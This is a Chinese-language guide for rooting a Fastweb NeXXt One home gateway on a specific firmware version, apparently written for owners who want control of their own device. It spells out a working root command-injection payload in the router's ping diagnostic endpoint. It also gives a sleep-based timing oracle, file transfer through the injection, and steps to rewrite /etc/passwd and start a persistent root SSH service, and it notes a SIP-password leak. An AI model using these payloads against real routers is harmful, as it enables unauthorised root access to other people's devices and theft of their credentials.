# NeXXt One（FGA221D / GDNT-S）Root 与诊断完整指南（中文）

> **适用对象**：想完全掌控自己网关的 Fastweb NeXXt One 用户。
> 全部内容在固件 `22.2.0378_FW_058_FGA221D`（前端资源时间戳 `20260515082010`）上实测。
> 本仓库所有工具均为原创，未使用任何社区利用代码。

**目录**：0 安全模型 · 1 设备事实 · 2 Web 会话与登录 · 3 命令注入 · 4 时序神谕 ·
5 可靠文件传输 · 6 持久 SSH · 7 防火墙真相与精确放行 · 8 排障速查 · 9 FAQ · 10 恢复与安全

---

## 0. 安全模型（先读）

- 只在你自己的网关、自己的 LAN 上操作。
- 绝不刷固件、不动启动 bank、不改 root 密码、不碰 TR-069（cwmp）——这些才是真正可能
  变砖或破坏运营商关系的动作。
- 上传到路由器的只有本地生成的数据（你的 SSH 公钥、小命令），不上传第三方二进制。
- 永远留后路：改之前备份、优先运行时（非持久）改动、有风险的操作走持久 SSH 而不是注入。

## 1. 设备事实

| 项目 | 值 |
|---|---|
| 产品 | Fastweb NeXXt One（`FGA221DFWB`） |
| 板卡 | `GDNT-S`（Technicolor/Vantiva Homeware） |
| 系统 | armv7l，OpenWrt 系，Linux 4.19 |
| 固件 | `22.2.0378_FW_058_FGA221D`（FW_056…058 共用 Web 栈） |
| Web UI | `https://192.168.1.254`，nginx，自签证书 |
| SSH/telnet | 默认关闭（22/23 拒绝） |
| dropbear | 2019.x —— **不支持 `-R`、`-E`，不支持 ed25519/ecdsa 密钥** |

常用只读服务（`nvget`）：`sysinfo`、`wanstatusinfo`、`lan_status`、`lanipv6details`、
`laninfo`、`firewall_conf`、`dmz_conf`、`virtual_server_list`、`upnp_conf`、`pingstatusinfo`。
注意：`statusinfo` 在该固件上返回 404。

## 2. Web 会话与登录

- **没有密码登录**。登录 = 20 秒窗口内**同时按住机身侧面两个按钮 3 秒**（文案 `LOGIN.INFO`）。
- API 全部走 `GET /status.cgi`：读 `?nvget=<服务>&_=<ms>`；写 `?act=nvset&service=<服务>&<参数>&_=<ms>`。
- 会话凭证：`sessionID` Cookie（HttpOnly）。
- 按键登录握手（前端行为）：
  1. `act=nvset&service=login_confirm&cmd=7&loginPath=2`（武装窗口）
  2. 轮询 `nvget=login_confirm&cmd=7` → `loginPath:"1"` = 检测到按键
  3. `act=nvset&service=login_confirm&cmd=7&loginPath=1`（状态机复位，返回 "0" 正常）
  4. `nvget=login_confirm&cmd=4` → `login_status:"1"` 即已认证
- **已知坑**：脚本复现该流程能检测到按键，但 `login_status` 不一定变 1（会话疑似绑定
  浏览器上下文）。**可靠做法**：浏览器登录一次 → 开发者工具导出 HAR →
  `nexxt_session.py import-cookie capture.har` 复用 sessionID。浏览器不退出登录，会话一直有效。

## 3. 命令注入（FW_058 已证实）

- 入口：`act=nvset&service=pingstatus&host=<载荷>&state=Requested&name=ping`
- 载荷：`host = :::::::;<shell 命令>`（`:::::::` 用于通过前端无锚定的 IPv6 弱校验；
  后端把 host 直接拼进 shell，以 **root** 执行）。
- 空格用 `${IFS}` 代替（命令经 URL 编码传输，服务端解码后交给 shell）。
- **后端剥掉 `>` 字符**！所有重定向（`>`、`>>`、`2>&1`）都会坏。写文件用 `| tee <路径>`
  （实测可用）。stderr 无法并入 stdout，命令设计要避开。
- **内容过滤**：含某些子串的 host 会被静默丢弃（命令完全不执行），同一串稳定复现。
  对策：分段 + 二分，见 §5。
- 结果轮询：`nvget=pingstatusinfo`，`DiagnosticsState` 从 `Requested` 变为
  `Complete`/`Error_*`。注入串通常报 `Error_CannotResolveHostName`，但命令已执行。
- `pingstatusinfo.IPv4` 会**原样回显** host 参数（shell 展开前）——可用来确认服务端收到了什么。
- **注入命令运行在隔离网络命名空间**：ping/curl/wget LAN 主机、环回 HTTP、nc 监听全部失败，
  **没有网络输出通道**。但文件系统和 ubus 是通的——用 `uci` + `/etc/init.d/*` 让 procd
  在主命名空间起服务（SSH 就是这样起来的）。

## 4. 时序神谕（无 stdout 时的布尔读数）

```
host = :::::::;<条件> && sleep${IFS}8
```

整行耗时 ≈ 基线（约 2.3s）+ 8s ⇒ 条件为真。先用 `host=127.0.0.1` 测基线。
实测可用：`test -f`、`grep -q`、`wc -c <f> | grep -q '^393'`、
`md5sum <f> | grep -q <hash>`、`netstat -tln | grep -q :2222`、`test $(id -u) -eq 0`。

## 5. 可靠文件传输（`tools/nexxt_transfer.py`）

1. base64 → URL 安全字母（`+`→`-`，`/`→`_`）。
2. 切成 ≤48 字符段，每段独立幂等写入 `printf %s <seg> | tee /tmp/nxseg_<tag>_NNN`。
3. 每段用一次神谕验证：`grep -qFx <seg> <file>`（文件无尾随换行，整行精确匹配同时
   保证内容和长度）；失败重试，连续失败则二分（`NNN`→`NNNa`/`NNNb`，glob 字典序保持正确）。
4. 组装：`cat <parts> | tr '_-' '/+' | base64 -d | tee <目标>`。
   - busybox `tr` 把首位 `-` 当选项：用 `tr '_-' '/+'`。
   - 每条注入命令保持短（~200 字符以内）；分组组装。
5. 用 md5 神谕做端到端校验。
6. 执行是**异步且可能乱序/迟到**的：早先失败的写可能晚到并覆盖后来的正确内容
   （实测发生过）。传完再审计一遍。

## 6. 持久 SSH（`tools/nexxt_ssh.py`）

`bootstrap` 做的事（全部可逆）：

1. 备份 `/etc/passwd` 到 `/tmp/nx_passwd.bak`，把 root shell 从 `/bin/restricted_shell`
   改为 `/bin/ash`（必需；overlayfs 持久）。
2. 把你的 **RSA** 公钥传到 `/etc/dropbear/authorized_keys`（md5 校验）和
   `/root/.ssh/authorized_keys`。
3. 创建 UCI dropbear 实例：`enable=1`、`Port=2222`、`Interface=lan`、
   `PasswordAuth=off`、`RootPasswordAuth=off`；提交并 `/etc/init.d/dropbear restart`。

为什么必须走 procd：手动起的进程要么被 CGI 清理杀掉、要么活在隔离命名空间，
只有 procd 管的服务才可达。

持久化：UCI 提交进 flash + dropbear init 脚本开机 enabled + 固件 host key 在
`/etc/dropbear/` + 密钥在持久 overlay。**重启后仍在**。不要动运营商自己的
`dropbear.wan` 管理实例。

连接（新版 OpenSSH 要显式放开旧算法）：

```bash
ssh -i <私钥> -p 2222 \
  -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa \
  root@192.168.1.254
```

`teardown` 删除实例与密钥，并把 root shell 还原为 `/bin/restricted_shell`。

## 7. 防火墙真相与精确放行

- API 的 `firewall_conf enabled=0` **有误导性**：fw3 其实一直在运行，
  INPUT/FORWARD 默认 DROP，`firewall.fwconfig.level='normal'`（规则分组
  normalrules/laxrules/highrules/userrules）。IPv6 入站死于 `zone_wan_forward`
  的默认丢弃，不是"防火墙被关了"。
- 安全做法：**防火墙保持开启**，只加一条精确持久规则。例如给位于 `<服务器v6>` 的
  AmneziaWG/WireGuard 服务端：

  ```
  uci add firewall rule
  uci set firewall.@rule[-1].name='Allow-AWG-server-v6'
  uci set firewall.@rule[-1].src='wan'
  uci set firewall.@rule[-1].dest='lan'
  uci set firewall.@rule[-1].proto='udp'
  uci set firewall.@rule[-1].family='ipv6'
  uci set firewall.@rule[-1].dest_ip='<服务器v6>/128'
  uci set firewall.@rule[-1].dest_port='51820'
  uci set firewall.@rule[-1].target='ACCEPT'
  uci commit firewall && /etc/init.d/firewall restart
  ```

  落地在 `zone_wan_forward`，重启与防火墙重载后均存活。

## 8. 排障速查

| 现象 | 原因 / 处理 |
|---|---|
| 按键后 `login_status` 仍为 0 | 会话绑定浏览器上下文；改用 HAR cookie 导入 |
| 注入命令"没执行" | `>` 被剥（用 tee）/ 内容过滤（二分）/ 沙盒网络命名空间（网络操作注定失败） |
| 长请求被静默忽略 | host 长度/内容限制——拆短 |
| dropbear 起来了但密钥被拒 | ed25519 不支持（用 RSA）；文件须以换行结尾；`/bin/restricted_shell` 会挡登录 |
| 外网 IPv6 连接被 refused | 上游（运营商 6rd）代答，与设备无关——见 docs/fastweb-notes.md |
| 传输后文件内容不对 | 迟到/乱序执行覆盖了正确内容——重新审计分段并重写坏段 |

## 9. FAQ

- **需要物理接触吗？** 需要——会话来自机身按键（或复用按键建立的会话）。
- **会变砖吗？** 本指南不涉及 flash 布局、固件镜像、启动 bank、TR-069。teardown 可还原。
- **固件升级后还有效吗？** 当作无效处理，先重跑 probe。
- **运营商的 dropbear.wan？** 别碰，它限制在运营商网段且有 2FA。

## 10. 恢复与安全

- 还原 root shell：`sed -i 's#^\(root:.*:\)[^:]*$#\1/bin/restricted_shell#' /etc/passwd`
  （或重启前 `cp /tmp/nx_passwd.bak /etc/passwd`）。
- 移除 SSH：`python3 tools/nexxt_ssh.py teardown`。
- `/tmp` 产物重启自清；立即清理：`rm -f /tmp/nx* /tmp/k*.b64`。
- 浏览器 HAR 含 `sessionID`，还可能含 VoIP 凭据（`deviceinfo` 会泄露 base64 的 SIP 密码）——用完删除。
